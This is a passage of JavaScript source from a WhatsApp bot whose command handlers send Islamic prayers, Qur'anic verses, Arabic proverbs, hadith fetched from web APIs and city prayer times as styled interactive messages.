            "translation": "All greetings, blessings, and good prayers are for Allah. Peace be upon you, O Prophet, and the mercy of Allah and His blessings. Peace be upon us and upon the righteous servants of Allah. I bear witness that there is no deity except Allah, and I bear witness that Muhammad is the Messenger of Allah. O Allah, send blessings upon our master Muhammad and upon the family of our master Muhammad, as You sent blessings upon our master Ibrahim and upon the family of our master Ibrahim. And bless our master Muhammad and the family of our master Muhammad as You blessed our master Ibrahim and the family of our master Ibrahim throughout the worlds. Verily, You are Praiseworthy, Glorious."
        },
        {
            "id": 8,
            "name": "Salam",
            "arabic": "اَلسَّلاَمُ عَلَيْكُمْ وَرَحْمَةُ اللهِ وَبَرَكَاتُهُ",
            "latin": "Assalamualaikum Warohmatullahi Wabarokatuh",
            "translation": "Peace be upon you and Allah's mercy and blessings."
        }
      ]
  };

  let captionText = namazData.result.map((v, i) => 
      `*${i + 1}. ${v.name}*\n` +
      `*Arabic:* ${v.arabic}\n` +
      `*Latin:* ${v.latin}\n` +
      `*Translation:* _${v.translation}_`
  ).join('\n\n');

  let introduction = `*「 Namaz Prayers 」*\n\n`;

  // Create a message with design
  let msgs = generateWAMessageFromContent(m.chat, {
      viewOnceMessage: {
          message: {
              "messageContextInfo": {
                  "deviceListMetadata": {},
                  "deviceListMetadataVersion": 2
              },
              interactiveMessage: proto.Message.InteractiveMessage.create({
                  body: proto.Message.InteractiveMessage.Body.create({
                      text: `${introduction}${captionText}`
                  }),
                  footer: proto.Message.InteractiveMessage.Footer.create({
                      text: botname
                  }),
                  header: proto.Message.InteractiveMessage.Header.create({
                      hasMediaAttachment: false,
                      ...await prepareWAMessageMedia({ image: fs.readFileSync('./VTHmedia/theme/VthPic.jpg') }, { upload: VeranBotInc.waUploadToServer })
                  }),
                  nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                      buttons: [{
                          "name": "quick_reply",
                          "buttonParamsJson": `{\"display_text\":\"🌿\",\"id\":\"quick_reply_id\"}`
                      }],
                  }),
                  contextInfo: {
                      mentionedJid: [m.sender], 
                      forwardingScore: 999,
                      isForwarded: true,
                      forwardedNewsletterMessageInfo: {
                          newsletterJid: '100000000000000000@newsletter',
                          newsletterName: ownername,
                          serverMessageId: 143
                      }
                  }
              })
          }
      }
  }, { quoted: m });

  // Send the message
  return await VeranBotInc.relayMessage(m.chat, msgs.message, {});
}
break;


case 'masnoonduas': {
  // Read and parse the JSON file
  let src = JSON.parse(fs.readFileSync('./lib/doaharian.json', 'utf-8'));

  // Delay function to throttle requests
  function delay(ms) {
      return new Promise(resolve => setTimeout(resolve, ms));
  }

  // Translate function with retry logic
  async function translateText(text, targetLang) {
      let retries = 5;
      while (retries > 0) {
          try {
              await delay(500); // Delay between requests
              let result = await translate(text, { to: targetLang });
              return result.text;
          } catch (error) {
              console.error('Translation error:', error);
              if (error.message.includes('TooManyRequestsError')) {
                  await delay(10000); // Wait for 10 seconds before retrying
              } else {
                  return text; // Return original text if translation fails
              }
              retries -= 1;
          }
      }
      return text; // Return original text if all retries fail
  }

  // Create the caption with translations
  let caption = await Promise.all(src.map(async (v, i) => {
      // Translate title and translation to English
      let translatedTitle = await translateText(v.title, 'en');
      let translatedTranslation = await translateText(v.translation, 'en');

      return `
*${i + 1}.* ${translatedTitle}

❃ Latin :
${v.latin}

❃ Arabic :
${v.arabic}

❃ Translate :
${translatedTranslation}
`.trim();
  }));

  // Join all captions
  let captionText = caption.join('\n\n');

  // Create a message with design
  let msgs = generateWAMessageFromContent(m.chat, {
      viewOnceMessage: {
          message: {
              "messageContextInfo": {
                  "deviceListMetadata": {},
                  "deviceListMetadataVersion": 2
              },
              interactiveMessage: proto.Message.InteractiveMessage.create({
                  body: proto.Message.InteractiveMessage.Body.create({
                      text: captionText
                  }),
                  footer: proto.Message.InteractiveMessage.Footer.create({
                      text: botname
                  }),
                  header: proto.Message.InteractiveMessage.Header.create({
                      hasMediaAttachment: false,
                      ...await prepareWAMessageMedia({ image: fs.readFileSync('./VTHmedia/theme/VthPic.jpg')}, { upload: VeranBotInc.waUploadToServer })
                  }),
                  nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                      buttons: [{
                          "name": "quick_reply",
                          "buttonParamsJson": `{\"display_text\":\"🌿\",\"id\":\""}`
                      }],
                  }),
                  contextInfo: {
                      mentionedJid: [m.sender], 
                      forwardingScore: 999,
                      isForwarded: true,
                      forwardedNewsletterMessageInfo: {
                          newsletterJid: '100000000000000000@newsletter',
                          newsletterName: ownername,
                          serverMessageId: 143
                      }
                  }
              })
          }
      }
  }, { quoted: m });

  // Send the message
  return await VeranBotInc.relayMessage(m.chat, msgs.message, {});
}
break;



case 'ayatalkursi': {
  let caption = `
*「 Ayat Kursi 」*
اللَّهُ لَا إِلَهَ إِلَّا هُوَ الْحَيُّ الْقَيُّومُ لَا تَأْخُذُهُ سِنَةٌ وَلَا نَوْمٌ لَهُ مَا فِي السَّمَاوَاتِ وَمَا فِي الْأَرْضِ مَنْ ذَا الَّذِي يَشْفَعُ عِنْدَهُ إِلَّا بِإِذْنِهِ يَعْلَمُ مَا بَيْنَ أَيْدِيهِمْ وَمَا خَلْفَهُمْ وَلَا يُحِيطُونَ بِشَيْءٍ مِنْ عِلْمِهِ إِلَّا بِمَا شَاءَ وَسِعَ كُرْسِيُّهُ السَّمَاوَاتِ وَالْأَرْضَ وَلَا يَئُودُهُ حِفْظُهُمَا وَهُوَ الْعَلِيُّ الْعَظِيمُ
“Alloohu laa ilaaha illaa huwal hayyul qoyyuum, laa ta’khudzuhuu sinatuw walaa naum. Lahuu maa fissamaawaati wa maa fil ardli man dzal ladzii yasyfa’u ‘indahuu illaa biidznih, ya’lamu maa baina aidiihim wamaa kholfahum wa laa yuhiithuuna bisyai’im min ‘ilmihii illaa bimaa syaa’ wasi’a kursiyyuhus samaawaati wal ardlo walaa ya’uuduhuu hifdhuhumaa wahuwal ‘aliyyul ‘adhiim.”

ترجمہ:
اللہ، کوئی معبود نہیں سوائے اس کے، جو زندہ ہے، دائمی اور مسلسل اپنے مخلوقات کی دیکھ بھال کرتا ہے؛ نہ اونگھتا ہے اور نہ ہی سوتا ہے۔ جو کچھ آسمانوں اور زمین میں ہے، وہ سب اللہ کا ہے۔ اللہ کے پاس شفاعت کرنے کا اختیار کسی کو بھی نہیں، سوائے اس کے کہ اللہ اجازت دے۔
اللہ جانتا ہے جو کچھ ان کے سامنے ہے اور جو کچھ ان کے پیچھے ہے، اور وہ اللہ کے علم کے کسی بھی چیز کو نہیں جان سکتے سوائے اس کے جو اللہ چاہے۔ اللہ کی کرسی آسمانوں اور زمین کو محیط ہے، اور اللہ کو ان دونوں کو محفوظ رکھنے میں کوئی بوجھ نہیں محسوس ہوتا، اور اللہ بہت بلند اور عظیم ہے۔
(QS. Al Baqarah: 255)
  `.trim();
  
  await VeranBotInc.sendText(m.chat, caption);
}
break

case 'niyatnamaz': {
  if (!q) return m.reply(`Usage Example:\nniyatnamaz Subuh`);
  
  const niyatnamaz = [
      {
          index: 1,
          solat: "subuh",
          latin: "Ushalli fardhosh shubhi rok'ataini mustaqbilal qiblati adaa-an lillaahi ta'aala",
          arabic: "اُصَلِّى فَرْضَ الصُّبْحِ رَكْعَتَيْنِ مُسْتَقْبِلَ الْقِبْلَةِ اَدَاءً ِللهِ تَعَالَى",
          translation_en: "I intend to perform the Fardh of Subuh (Fajr) with two raka'ats facing the Qibla for the sake of Allah Ta'ala",
      },
      {
          index: 2,
          solat: "maghrib",
          latin: "Ushalli fardhol maghribi tsalaata raka'aatim mustaqbilal qiblati adaa-an lillaahi ta'aala",
          arabic: "اُصَلِّى فَرْضَ الْمَغْرِبِ ثَلاَثَ رَكَعَاتٍ مُسْتَقْبِلَ الْقِبْلَةِ اَدَاءً ِللهِ تَعَالَى",
          translation_en: "I intend to perform the Fardh of Maghrib with three raka'ats facing the Qibla for the sake of Allah Ta'ala",
      },
      {
          index: 3,
          solat: "dzuhur",
          latin: "Ushalli fardhodl dhuhri arba'a raka'aatim mustaqbilal qiblati adaa-an lillaahi ta'aala",
          arabic: "اُصَلِّى فَرْضَ الظُّهْرِاَرْبَعَ رَكَعَاتٍ مُسْتَقْبِلَ الْقِبْلَةِ اَدَاءً ِللهِ تَعَالَى",
          translation_en: "I intend to perform the Fardh of Dzuhur (Dhuhr) with four raka'ats facing the Qibla for the sake of Allah Ta'ala",
      },
      {
          index: 4,
          solat: "isha",
          latin: "Ushalli fardhol 'isyaa-i arba'a raka'aatim mustaqbilal qiblati adaa-an lillaahi ta'aala",
          arabic: "صَلِّى فَرْضَ الْعِشَاءِ اَرْبَعَ رَكَعَاتٍ مُسْتَقْبِلَ الْقِبْلَةِ اَدَاءً ِللهِ تَعَالَى",
          translation_en: "I intend to perform the Fardh of Isha with four raka'ats facing the Qibla for the sake of Allah Ta'ala",
      },
      {
          index: 5,
          solat: "ashar",
          latin: "Ushalli fardhol 'ashri arba'a raka'aatim mustaqbilal qiblati adaa-an lillaahi ta'aala",
          arabic: "صَلِّى فَرْضَ الْعَصْرِاَرْبَعَ رَكَعَاتٍ مُسْتَقْبِلَ الْقِبْلَةِ اَدَاءً ِللهِ تَعَالَى",
          translation_en: "I intend to perform the Fardh of Ashar (Asr) with four raka'ats facing the Qibla for the sake of Allah Ta'ala",
      }
  ];
  
  let text = q.toLowerCase() || '';
  let data = niyatnamaz.find(v => v.solat === text);
  
  if (!data) {
      return m.reply(`Command ${text} Not Found\n\nList of 5 Daily Prayers:\n• Subuh\n• Maghrib\n• Dzuhur\n• Isha\n• Ashar`);
  }

  const responseText = `
_*Intention for the ${text} Prayer*_

*Arabic:* ${data.arabic}

*Latin:* ${data.latin}

*Translation:* ${data.translation_en}`.trim();

  // Prepare and send the reply using your bot's method
  let msgs = generateWAMessageFromContent(m.chat, {
      viewOnceMessage: {
          message: {
              "messageContextInfo": {
                  "deviceListMetadata": {},
                  "deviceListMetadataVersion": 2
              },
              interactiveMessage: proto.Message.InteractiveMessage.create({
                  body: proto.Message.InteractiveMessage.Body.create({
                      text: responseText
                  }),
                  footer: proto.Message.InteractiveMessage.Footer.create({
                      text: botname
                  }),
                  header: proto.Message.InteractiveMessage.Header.create({
                      hasMediaAttachment: false,
                      ...await prepareWAMessageMedia({ image: fs.readFileSync('./VTHmedia/theme/VthPic.jpg')}, { upload: VeranBotInc.waUploadToServer })
                  }),
                  nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                      buttons: [{
                          "name": "quick_reply",
                          "buttonParamsJson": `{\"display_text\":\"🌿\",\"id\":\""}`
                      }],
                  }), 
                  contextInfo: {
                      mentionedJid: [m.sender], 
                      forwardingScore: 999,
                      isForwarded: true,
                      forwardedNewsletterMessageInfo: {
                          newsletterJid: '100000000000000000@newsletter',
                          newsletterName: ownername,
                          serverMessageId: 143
                      }
                  }
              })
          }
      }
  }, { quoted: m });

  return await VeranBotInc.relayMessage(m.chat, msgs.message, {});
}
break;


case 'quotesislami': {
  const islami = [
      {
          "id": "1",
          "arabic": "مَنْ سَارَ عَلىَ الدَّرْبِ وَصَلَ",
          "translation_en": "Whoever walks the path will reach (their goal)."
      },
      {
          "id": "2",
          "arabic": "مَنْ صَبَرَ ظَفِرَ",
          "translation_en": "Whoever is patient will be successful."
      },
      {
          "id": "3",
          "arabic": "مَنْ جَدَّ وَجَـدَ",
          "translation_en": "Whoever strives will achieve (success)."
      },
      {
          "id": "4",
          "arabic": "جَالِسْ أَهْلَ الصِّدْقِ وَالوَفَاءِ",
          "translation_en": "Associate with those who are truthful and trustworthy."
      },
      {
          "id": "5",
          "arabic": "مَنْ قَلَّ صِدْقُهُ قَلَّ صَدِيْقُهُ",
          "translation_en": "Whoever has little honesty will have few friends."
      },
      {
          "id": "6",
          "arabic": "مَوَدَّةُ الصَّدِيْقِ تَظْهَرُ وَقْتَ الضِّيْقِ",
          "translation_en": "The affection of a friend shows in times of hardship."
      },
      {
          "id": "7",
          "arabic": "الصَّبْرُ يُعِيْنُ عَلَى كُلِّ عَمَلٍ",
          "translation_en": "Patience helps with every task."
      },
      {
          "id": "8",
          "arabic": "وَمَا اللَّذَّةُ إِلاَّ بَعْدَ التَّعَبِ",
          "translation_en": "There is no pleasure except after effort."
      },
      {
          "id": "9",
          "arabic": "جَرِّبْ وَلاَحِظْ تَكُنْ عَارِفًا",
          "translation_en": "Try and observe, and you will gain knowledge."
      },
      {
          "id": "10",
          "arabic": "بَيْضَةُ اليَوْمِ خَيْرٌ مِنْ دَجَاجَةِ الغَدِ",
          "translation_en": "Today's egg is better than tomorrow's chicken."
      },
      {
          "id": "11",
          "arabic": "أُطْلُبِ الْعِلْمَ مِنَ الْمَهْدِ إِلَى الَّلحْدِ",
          "translation_en": "Seek knowledge from the cradle to the grave."
      },
      {
          "id": "12",
          "arabic": "الوَقْتُ أَثْمَنُ مِنَ الذَّهَبِ",
          "translation_en": "Time is more valuable than gold."
      },
      {
          "id": "13",
          "arabic": "لاَ خَيْرَ فيِ لَذَّةٍ تَعْقِبُ نَدَماً",
          "translation_en": "There is no good in pleasure that is followed by regret."
      },
      {
          "id": "14",
          "arabic": "أَخِي لَنْ تَنَالَ العِلْمَ إِلاَّ بِسِتَّةٍ سَأُنْبِيْكَ عَنْ تَفْصِيْلِهَا بِبَيَانٍ: ذَكَاءٌ وَحِرْصٌ وَاجْتِهَادٌ وَدِرْهَمٌ وَصُحْبَةُ أُسْتَاذٍ وَطُوْلُ زَمَانٍ",
          "translation_en": "My brother, you will not attain knowledge except through six things: intelligence, eagerness, diligence, money, companionship with a teacher, and a long period of time."
      },
      {
          "id": "15",
          "arabic": "لاَ تَكُنْ رَطْباً فَتُعْصَرَ وَلاَ يَابِسًا فَتُكَسَّرَ",
          "translation_en": "Do not be soft so that you are easily zed, nor hard so that you are easily broken."
      },
      {
          "id": "16",
          "arabic": "لِكُلِّ مَقَامٍ مَقَالٌ وَلِكُلِّ مَقَالٍ مَقَامٌ",
          "translation_en": "Every place has its own speech, and every speech has its own place."
      },
      {
          "id": "17",
          "arabic": "خَيْرُ النَّاسِ أَحْسَنُهُمْ خُلُقاً وَأَنْفَعُهُمْ لِلنَّاسِ",
          "translation_en": "The best of people are those who have the best manners and are the most beneficial to others."
      },
      {
          "id": "18",
          "arabic": "خَيْرُ جَلِيْسٍ في الزّمانِ كِتابُ",
          "translation_en": "The best companion in any era is a book."
      },
      {
          "id": "19",
          "arabic": "مَنْ يَزْرَعْ يَحْصُدْ",
          "translation_en": "Whoever plants will harvest."
      },
      {
          "id": "20",
          "arabic": "لَوْلاَ العِلْمُ لَكَانَ النَّاسُ كَالبَهَائِمِ",
          "translation_en": "If not for knowledge, people would be like animals."
      },
      {
          "id": "21",
          "arabic": "سَلاَمَةُ الإِنْسَانِ فيِ حِفْظِ اللِّسَانِ",
          "translation_en": "The safety of a person lies in the protection of their tongue (words)."
      },
      {
          "id": "22",
          "arabic": "الرِّفْقُ بِالضَّعِيْفِ مِنْ خُلُقِ الشَّرِيْفِ",
          "translation_en": "Being gentle with the weak is a mark of noble character."
      },
      {
          "id": "23",
          "arabic": "وَعَامِلِ النَّاسَ بِمَا تُحِبُّ مِنْهُ دَائِماً",
          "translation_en": "Treat people in a way that you would like to be treated."
      },
      {
          "id": "24",
          "arabic": "لَيْسَ الجَمَالُ بِأَثْوَابٍ تُزَيِّنُنُا إِنَّ الجَمَالَ جمَاَلُ العِلْمِ وَالأَدَبِ",
          "translation_en": "Beauty is not in the clothes that adorn us, but in knowledge and manners."
      },
      {
          "id": "25",
          "arabic": "مَنْ أَعاَنَكَ عَلىَ الشَّرِّ ظَلَمَكَ",
          "translation_en": "Whoever helps you in wrongdoing has wronged you."
      }
  ];
  
  // Select a random quote
  const randomIndex = Math.floor(Math.random() * islami.length);
  const randomQuote = islami[randomIndex];
  const { arabic, translation_en } = randomQuote;

  // Prepare the response text
  const responseText = `${arabic}\n\n${translation_en}`;

  // Prepare and send the reply using your bot's method
  let msgs = generateWAMessageFromContent(m.chat, {
      viewOnceMessage: {
          message: {
              "messageContextInfo": {
                  "deviceListMetadata": {},
                  "deviceListMetadataVersion": 2
              },
              interactiveMessage: proto.Message.InteractiveMessage.create({
                  body: proto.Message.InteractiveMessage.Body.create({
                      text: responseText
                  }),
                  footer: proto.Message.InteractiveMessage.Footer.create({
                      text: botname
                  }),
                  header: proto.Message.InteractiveMessage.Header.create({
                      hasMediaAttachment: false,
                      ...await prepareWAMessageMedia({ image: fs.readFileSync('./VTHmedia/theme/VthPic.jpg')}, { upload: VeranBotInc.waUploadToServer })
                  }),
                  nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                      buttons: [{
                          "name": "quick_reply",
                          "buttonParamsJson": `{\"display_text\":\"🌿\",\"id\":\""}`
                      }],
                  }), 
                  contextInfo: {
                      mentionedJid: [m.sender], 
                      forwardingScore: 999,
                      isForwarded: true,
                      forwardedNewsletterMessageInfo: {
                          newsletterJid: '100000000000000000@newsletter',
                          newsletterName: ownername,
                          serverMessageId: 143
                      }
                  }
              })
          }
      }
  }, { quoted: m });

  return await VeranBotInc.relayMessage(m.chat, msgs.message, {});
}
break;

case 'assalamualaikum': {
  // Prepare the response text
  const responseText = "Waalaikumsalam Wa Rehmatullahi Wa Barakatuhu";

  // Prepare and send the reply using your bot's method
  let msgs = generateWAMessageFromContent(m.chat, {
      viewOnceMessage: {
          message: {
              "messageContextInfo": {
                  "deviceListMetadata": {},
                  "deviceListMetadataVersion": 2
              },
              interactiveMessage: proto.Message.InteractiveMessage.create({
                  body: proto.Message.InteractiveMessage.Body.create({
                      text: responseText
                  }),
                  footer: proto.Message.InteractiveMessage.Footer.create({
                      text: botname
                  }),
                  header: proto.Message.InteractiveMessage.Header.create({
                      hasMediaAttachment: false,
                      ...await prepareWAMessageMedia({ image: fs.readFileSync('./VTHmedia/theme/VthPic.jpg')}, { upload: VeranBotInc.waUploadToServer })
                  }),
                  nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                      buttons: [{
                          "name": "quick_reply",
                          "buttonParamsJson": `{\"display_text\":\"🌿\",\"id\":\""}`
                      }],
                  }), 
                  contextInfo: {
                      mentionedJid: [m.sender], 
                      forwardingScore: 999,
                      isForwarded: true,
                      forwardedNewsletterMessageInfo: {
                          newsletterJid: '100000000000000000@newsletter',
                          newsletterName: ownername,
                          serverMessageId: 143
                      }
                  }
              })
          }
      }
  }, { quoted: m });

  return await VeranBotInc.relayMessage(m.chat, msgs.message, {});
}
break;

case 'hadith': {
  const apiUrl = 'https://api.lolhuman.xyz/api/hadits/detail/Sunan_Tirmidzi/1769?apikey=dcb4198762eb793a386a9c1c';

  // Fetch data from the API
  let response = await fetch(apiUrl);
  let data = await response.json();

  if (data.status !== 200) {
      return await VeranBotInc.sendText(m.chat, "Failed to fetch Hadith details.");
  }

  // Extract relevant data
  let hadith = data.result['1'];
  let hadithText = hadith.nass;

  // Delay function to throttle requests
  function delay(ms) {
      return new Promise(resolve => setTimeout(resolve, ms));
  }

  // Translate function with retry logic
  async function translateText(text, targetLang) {
      let retries = 5;
      while (retries > 0) {
          try {
              await delay(500); // Delay between requests
              let result = await translate(text, { to: targetLang });
              return result.text;
          } catch (error) {
              console.error('Translation error:', error);
              if (error.message.includes('TooManyRequestsError')) {
                  await delay(10000); // Wait for 10 seconds before retrying
              } else {
                  return text; // Return original text if translation fails
              }
              retries -= 1;
          }
      }
      return text; // Return original text if all retries fail
  }

  // Translate hadith text to Urdu
  let translatedHadith = await translateText(hadithText, 'ur');

  // Create the caption with translations
  let captionText = `
*Hadith ID:* ${hadith.id}

❃ Original Text :
${hadithText}

❃ Translated Text (Urdu) :
${translatedHadith}
`.trim();

  // Create a message with design
  let msgs = generateWAMessageFromContent(m.chat, {
      viewOnceMessage: {
          message: {
              "messageContextInfo": {
                  "deviceListMetadata": {},
                  "deviceListMetadataVersion": 2
              },
              interactiveMessage: proto.Message.InteractiveMessage.create({
                  body: proto.Message.InteractiveMessage.Body.create({
                      text: captionText
                  }),
                  footer: proto.Message.InteractiveMessage.Footer.create({
                      text: botname
                  }),
                  header: proto.Message.InteractiveMessage.Header.create({
                      hasMediaAttachment: false,
                      ...await prepareWAMessageMedia({ image: fs.readFileSync('./VTHmedia/theme/VthPic.jpg')}, { upload: VeranBotInc.waUploadToServer })
                  }),
                  nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                      buttons: [{
                          "name": "quick_reply",
                          "buttonParamsJson": `{\"display_text\":\"🌿\",\"id\":\""}`
                      }],
                  }),
                  contextInfo: {
                      mentionedJid: [m.sender], 
                      forwardingScore: 999,
                      isForwarded: true,
                      forwardedNewsletterMessageInfo: {
                          newsletterJid: '100000000000000000@newsletter',
                          newsletterName: ownername,
                          serverMessageId: 143
                      }
                  }
              })
          }
      }
  }, { quoted: m });

  // Send the message
  return await VeranBotInc.relayMessage(m.chat, msgs.message, {});
}
break;


case 'prophetname': {
  try {
    // Define the API URL
    const apiUrl = `${global.api}islamic/prophet-names?apikey=${global.id}`;

    // Fetch data from the API
    let response = await fetch(apiUrl);
    let data = await response.json();

    // Check if the request was successful
    if (data.status !== 200) {
      return await VeranBotInc.sendText(m.chat, "Failed to fetch Prophet's name.");
    }

    // Extract the Prophet's name
    let prophetName = data.result.name;

    // Create the message content
    let captionText = `
*Prophet's Name:*
${prophetName}
`.trim();

    // Prepare and send the message
    let msgs = generateWAMessageFromContent(m.chat, {
      viewOnceMessage: {
        message: {
          messageContextInfo: {
            deviceListMetadata: {},
            deviceListMetadataVersion: 2
          },
          interactiveMessage: proto.Message.InteractiveMessage.create({
            body: proto.Message.InteractiveMessage.Body.create({
              text: captionText
            }),
            footer: proto.Message.InteractiveMessage.Footer.create({
              text: botname
            }),
            header: proto.Message.InteractiveMessage.Header.create({
              hasMediaAttachment: false,
              ...await prepareWAMessageMedia({ image: fs.readFileSync('./VTHmedia/theme/VthPic.jpg')}, { upload: VeranBotInc.waUploadToServer })
            }),
            nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
              buttons: [{
                name: "quick_reply",
                buttonParamsJson: "{\"display_text\":\"🌿\",\"id\":\"\"}"
              }],
            }),
            contextInfo: {
              mentionedJid: [m.sender], 
              forwardingScore: 999,
              isForwarded: true,
              forwardedNewsletterMessageInfo: {
                newsletterJid: '100000000000000000@newsletter',
                newsletterName: ownername,
                serverMessageId: 143
              }
            }
          })
        }
      }
    }, { quoted: m });

    return await VeranBotInc.relayMessage(m.chat, msgs.message, {});
  } catch (error) {
    console.error('Error fetching Prophet\'s name:', error);
    return await VeranBotInc.sendText(m.chat, "An error occurred while fetching the Prophet's name.");
  }
}
break;

case 'prayertime': {
  // Extract the city name from the command input
  let city = m.text.split(' ').slice(1).join(' ');
  if (!city) {
      return await VeranBotInc.sendText(m.chat, "Please provide a city name, e.g., `prayertime Lahore`.");
  }

  // Define the API URL with the city parameter using global variables
  const apiUrl = `${global.api}islamic/prayer-times?city=${encodeURIComponent(city)}&apikey=${global.id}`;

  try {
      // Fetch data from the API
      let response = await fetch(apiUrl);
      let data = await response.json();

      // Check if the request was successful
      if (data.status !== 200 || data.result.status_valid !== 1) {
          return await VeranBotInc.sendText(m.chat, "Failed to fetch prayer times. Please check the city name and try again.");
      }

      // Assign emojis for each prayer time
      let fajrEmoji = '🌅';
      let dhuhrEmoji = '🌞';
      let asrEmoji = '🌤';
      let maghribEmoji = '🌇';
      let ishaEmoji = '🌙';

      // Extract relevant data
      let cityName = data.result.city;
      let method = data.result.prayer_method_name;
      let items = data.result.items[0];
      let fajr = fajrEmoji + ' Fajr: ' + items.fajr;
      let dhuhr = dhuhrEmoji + ' Dhuhr: ' + items.dhuhr;
      let asr = asrEmoji + ' Asr: ' + items.asr;
      let maghrib = maghribEmoji + ' Maghrib: ' + items.maghrib;
      let isha = ishaEmoji + ' Isha: ' + items.isha;

      // Create the message content
      let captionText = `
*Prayer Times for ${cityName}:*

${fajr}
${dhuhr}
${asr}
${maghrib}
${isha}

*Method:* ${method}
`.trim();

      // Prepare and send the message
      let msgs = generateWAMessageFromContent(m.chat, {
          viewOnceMessage: {
              message: {
                  "messageContextInfo": {
                      "deviceListMetadata": {},
                      "deviceListMetadataVersion": 2
                  },
                  interactiveMessage: proto.Message.InteractiveMessage.create({
                      body: proto.Message.InteractiveMessage.Body.create({
                          text: captionText
                      }),
                      footer: proto.Message.InteractiveMessage.Footer.create({
                          text: botname
                      }),
                      header: proto.Message.InteractiveMessage.Header.create({
                          hasMediaAttachment: false,
                          ...await prepareWAMessageMedia({ image: fs.readFileSync('./VTHmedia/theme/VthPic.jpg')}, { upload: VeranBotInc.waUploadToServer })
                      }),
                      nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                          buttons: [{
                              "name": "quick_reply",
                              "buttonParamsJson": `{\"display_text\":\"🌿\",\"id\":\""}`
                          }],
                      }),
                      contextInfo: {
                          mentionedJid: [m.sender], 
                          forwardingScore: 999,
                          isForwarded: true,
                          forwardedNewsletterMessageInfo: {
                              newsletterJid: '100000000000000000@newsletter',
                              newsletterName: ownername,
                              serverMessageId: 143
                          }
                      }
                  })
              }
          }
      }, { quoted: m });

      return await VeranBotInc.relayMessage(m.chat, msgs.message, {});
  } catch (error) {
      console.error('Error fetching prayer times:', error);
      return await VeranBotInc.sendText(m.chat, "An error occurred while fetching the prayer times.");
  }
}
break;

case 'sahihbukhari': {
  // Languages supported
  const languageNames = {
    'ar': 'Arabic',
    'ur': 'Urdu',
    'en': 'English',
    'id': 'Indonesian',
    'bn': 'Bengali',
    'rus': 'Russian',
    'tr': 'Turkish',
    'ta': 'Tamil'
  };

  // Initialize language if not provided
  if (!text || !Object.keys(languageNames).includes(text.toLowerCase())) {
    let languageButtons = Object.keys(languageNames).map(lang => ({
      title: languageNames[lang],
      description: `Select ${languageNames[lang]} language`,
      id: `${prefix}sahihbukhari ${lang}`
    }));

    let button = [{
      name: 'single_select',
      buttonParamsJson: {
        title: 'Select Language for Hadith:',
        sections: [{
          title: '*Available Languages*',
          rows: languageButtons
        }]
      }
    }];

    await VeranBotInc.sendButtonMsg(m.chat, '*Choose a language to fetch Hadith:*', null, '*Please select:*', null, button, m);
    return;
  }

  // Extract language from text
  const lang = text.toLowerCase();

  // Generate a random Hadith number between 1 and 7560
  const randomHadithNumber = Math.floor(Math.random() * 7560) + 1;

  try {
    // Fetch the Hadith from the API
    let url = `${global.api}islamic/hadith-sahih-al-bukhari?q=${randomHadithNumber}/${lang}&apikey=${global.id}`;
    let response = await fetch(url);
    let data = await response.json();

    // Check if the response is successful
    if (data.status === 200 && data.result && data.result.data && data.result.data.hadiths) {
      let hadiths = data.result.data.hadiths;
      if (hadiths.length > 0) {
        // Display the Hadith
        let hadith = hadiths[0];
        let hadithText = `*Hadith Number:* ${hadith.hadithnumber}\n`
                        + `*Text:* ${hadith.text}\n`
                        + `*Book:* ${hadith.reference.book}\n`
                        + `*Hadith:* ${hadith.reference.hadith}`;
        
        // Prepare message with text styling
        let captionText = `*Hadith Number:* ${hadith.hadithnumber}\n`
                        + `*Text:* ${hadith.text}\n`
                        + `*Book:* ${hadith.reference.book}\n`
                        + `*Hadith:* ${hadith.reference.hadith}`;
        
        let msgs = generateWAMessageFromContent(m.chat, {
            viewOnceMessage: {
                message: {
                    "messageContextInfo": {
                        "deviceListMetadata": {},
                        "deviceListMetadataVersion": 2
                    },
                    interactiveMessage: proto.Message.InteractiveMessage.create({
                        body: proto.Message.InteractiveMessage.Body.create({
                            text: captionText // Styled text
                        }),
                        footer: proto.Message.InteractiveMessage.Footer.create({
                            text: `_${botname}_` // Italics styling for botname
                        }),
                        header: proto.Message.InteractiveMessage.Header.create({
                            hasMediaAttachment: false,
                            ...await prepareWAMessageMedia({ image: fs.readFileSync('./VTHmedia/theme/VthPic.jpg')}, { upload: VeranBotInc.waUploadToServer })
                        }),
                        nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                            buttons: [{
                                "name": "quick_reply",
                                "buttonParamsJson": `{"display_text":"🌿","id":"${prefix}quickreply"}`
                            }],
                        }),
                        contextInfo: {
                            mentionedJid: [m.sender], 
                            forwardingScore: 999,
                            isForwarded: true,
                            forwardedNewsletterMessageInfo: {
                                newsletterJid: '100000000000000000@newsletter',
                                newsletterName: ownername,
                                serverMessageId: 143
                            }
                        }
                    })
                }
            }
        }, { quoted: m });

        return await VeranBotInc.relayMessage(m.chat, msgs.message, {});
      } else {
        await VeranBotInc.sendText(m.chat, "*No Hadith found for the given query.*");
      }
    } else {
      await VeranBotInc.sendText(m.chat, "*Failed to fetch Hadith. Please try again later.*");
    }
  } catch (error) {
    await VeranBotInc.sendText(m.chat, "*Error occurred while fetching Hadith.*");
  }
}
break;

case 'jamiattirmidhi': {
  // Languages supported
  const languageNames = {
    'ar': 'Arabic',
    'ur': 'Urdu',
    'en': 'English',
    'id': 'Indonesian',
    'bn': 'Bengali',
    'tr': 'Turkish'
  };

  // Initialize language if not provided
  if (!text || !Object.keys(languageNames).includes(text.toLowerCase())) {
    let languageButtons = Object.keys(languageNames).map(lang => ({
      title: languageNames[lang],
      description: `Select ${languageNames[lang]} language`,
      id: `${prefix}jamiattirmidhi ${lang}`
    }));

    let button = [{
      name: 'single_select',
      buttonParamsJson: {
        title: 'Select Language for Hadith:',
        sections: [{
          title: '*Available Languages*',
          rows: languageButtons
        }]
      }
    }];

    await VeranBotInc.sendButtonMsg(m.chat, '*Choose a language to fetch Hadith:*', null, '*Please select:*', null, button, m);
    return;
  }

  // Extract language from text
  const lang = text.toLowerCase();

  // Generate a random Hadith number between 1 and 148
  const randomHadithNumber = Math.floor(Math.random() * 148) + 1;

  try {
